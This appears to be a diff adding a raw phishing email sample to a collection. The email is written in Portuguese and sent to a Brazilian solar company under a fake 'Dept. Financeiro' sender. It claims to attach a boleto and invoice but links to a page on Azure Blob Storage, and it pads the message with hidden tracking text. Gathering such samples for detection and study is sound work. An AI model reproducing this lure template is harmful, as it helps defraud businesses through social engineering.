@@ -1,0 +1,145 @@
+Return-Path: <mtnum@qeme27.segurancasweb.com>
+Delivered-To: contato@soliveenergiasolar.com.br
+Received: from cpl02.main-hosting.eu
+	by cpl02.main-hosting.eu with LMTP
+	id AOxUI6R3BGaAGgAAIElduQ
+	(envelope-from <mtnum@qeme27.segurancasweb.com>)
+	for <contato@soliveenergiasolar.com.br>; Wed, 27 Mar 2024 19:46:44 +0000
+Return-path: <mtnum@qeme27.segurancasweb.com>
+Envelope-to: contato@soliveenergiasolar.com.br
+Delivery-date: Wed, 27 Mar 2024 19:46:44 +0000
+Received: from 33.143.190.35.bc.googleusercontent.com ([35.190.143.33]:44094 helo=qeme27.segurancasweb.com)
+	by cpl02.main-hosting.eu with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.96.2)
+	(envelope-from <mtnum@qeme27.segurancasweb.com>)
+	id 1rpZER-0008B7-1W
+	for contato@soliveenergiasolar.com.br;
+	Wed, 27 Mar 2024 19:46:44 +0000
+Received: from localhost (localhost [127.0.0.1])
+	by qeme27.segurancasweb.com (Postfix) with UTF8SMTP id 124E36D6322
+	for <contato@soliveenergiasolar.com.br>; Wed, 27 Mar 2024 19:45:07 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+ s=qeme27; d=qeme27.segurancasweb.com; t=1711568707;
+  h=from:subject:date:message-id:to:mime-version:content-type:
+ accept-language:user-agent:x-mailer:x-sender:content-language:
+ list-unsubscribe; bh=T+1wfx5MDhdXEZz3pFlQQPXKjY+2HBluuVodTa25MHE=;
+ b=DBhCz4pif3V7FOdgOXn5uTwVLmdoiGKCMES5mHuoZD8IIj8h+WGJnabqALxqe8BY1D6+5t
+ Wh8TGdo2z17wXbWUMhSTmHVfnLZgHZKl3FA310fTXjUCLiYpJsIZcsmUdanYe5T4sEwD2O
+ rr6R2bMSze9CKm2w4A0yRTLGi4Pq+tANsnxNIevHwQCzGFqQuYNOxoD65qtbjr7I/DdbQD
+ XJ8IjfM1Rx7MABYaWXJp2eg6jIm+FvYoj1KfEXVoMxXso9H8AuuphjLLH+UMQkssHCv71d
+ SG4MklUZqo0YYXB+9cH4tZ87qmyKfI46DydwpEzu5g6BJQx9+uZFdty5leBICw==
+MIME-Version: 1.0
+List-Unsubscribe: 
+ <https://qeme27.segurancasweb.com/?action=unsubscribe&u=contato@soliveenergiasolar.com.br>
+X-Sender: mtnum@qeme27.segurancasweb.com
+Accept-Language: pt-BR, en-US
+Date: Wed, 27 Mar 2024 19:45:07 +0000
+To: <contato@soliveenergiasolar.com.br>
+User-Agent: Roundcube Webmail/1.4.13
+Content-Language: pt-BR
+Message-Id: <90e71ecf6871d9375b3e6d49f0103d16@qeme27.segurancasweb.com>
+From: "Dept. Financeiro" <mtnum@qeme27.segurancasweb.com>
+Subject: Boleto e Nota Fiscal
+X-Mailer: Roundcube Webmail/1.4.13
+Content-Type: multipart/alternative;
+ boundary=f36fe26d0128fa8f5a79c69e6b9766ae8d172ba8a7702edf274bdd733656
+X-Spam-Status: No, score=3.5
+X-Spam-Score: 35
+X-Spam-Bar: +++
+X-Ham-Report: Spam detection software, running on the system "cpl02.main-hosting.eu",
+ has NOT identified this incoming email as spam.  The original
+ message has been attached to this so you can view it or label
+ similar future email.  If you have any questions, see
+ root\@localhost for details.
+ Content preview:  Boleto e Nota Fiscal Bom dia, Segue em anexo o boleto e a
+   nota fiscal. 
+ Content analysis details:   (3.5 points, 5.0 required)
+  pts rule name              description
+ ---- ---------------------- --------------------------------------------------
+  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
+                             blocked.  See
+                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
+                              for more information.
+                             [URIs: windows.net]
+  0.0 URIBL_DBL_BLOCKED_OPENDNS ADMINISTRATOR NOTICE: The query to
+                             dbl.spamhaus.org was blocked due to usage
+                             of an open resolver. See
+                             https://www.spamhaus.org/returnc/pub/
+                             [URIs: segurancasweb.com]
+  0.0 URIBL_ZEN_BLOCKED_OPENDNS ADMINISTRATOR NOTICE: The query to
+                             zen.spamhaus.org was blocked due to usage
+                             of an open resolver. See
+                             https://www.spamhaus.org/returnc/pub/
+                             [URIs: windows.net]
+  0.0 TVD_RCVD_IP            Message was received from an IP address
+ -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
+ -0.0 SPF_PASS               SPF: sender matches SPF record
+  0.0 HTML_MESSAGE           BODY: HTML included in message
+ -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
+  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
+                             valid
+ -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
+                             author's domain
+ -0.0 T_SCC_BODY_TEXT_LINE   No description available.
+  2.6 RDNS_DYNAMIC           Delivered to internal network by host with
+                             dynamic-looking rDNS
+  1.0 KAM_HTMLNOISE          Spam containing useless HTML padding
+X-Spam-Flag: NO
+
+--f36fe26d0128fa8f5a79c69e6b9766ae8d172ba8a7702edf274bdd733656
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html>
+<html lang=3D"pt-BR">
+<head>
+    <meta charset=3D"UTF-8">
+    <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=
+=3D1.0">
+    <title>Boleto e Nota Fiscal</title>
+    <link rel=3D"stylesheet" href=3D"styles.css">
+<style></style></head>
+<body>
+    <div class=3D"container">
+        <div class=3D"message">
+            <p>Bom dia,</p>
+            <p>Segue em anexo o boleto e a nota fiscal.</p>
+            <p>
+                <a href=3D"https://26032024r.blob.core.windows.net/web/inde=
+x.html" target=3D"_blank" rel=3D"noreferrer">Clique aqui para baixar o Bole=
+to e a Nota Fiscal</a>
+            </p>
+        </div>
+        <div class=3D"signature">
+            <p>Atenciosamente;<br><br>Isadora Kawana<br>Dept. Financeiro</p=
+>
+        </div>
+    </div>
+</body>
+<br><br><br><br><br><br><br><br><br><font color=3D"#E6E6E6">n_7b40aaff-61a5=
+-45f2-8952-7ff82e02e92f</font></html>
+
+--f36fe26d0128fa8f5a79c69e6b9766ae8d172ba8a7702edf274bdd733656
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain; charset=UTF-8
+
+Bom dia,
+
+ Segue em anexo o boleto e a nota fiscal.
+
+ https://26032024r.blob.core.windows.net/web/index.html Atenciosamente;
+
+Isadora Kawana
+Dept. Financeiro
+
+=20
+
+
+
+
+
+
+
+
+n_7b40aaff-61a5-45f2-8952-7ff82e02e92f=20
+--f36fe26d0128fa8f5a79c69e6b9766ae8d172ba8a7702edf274bdd733656--
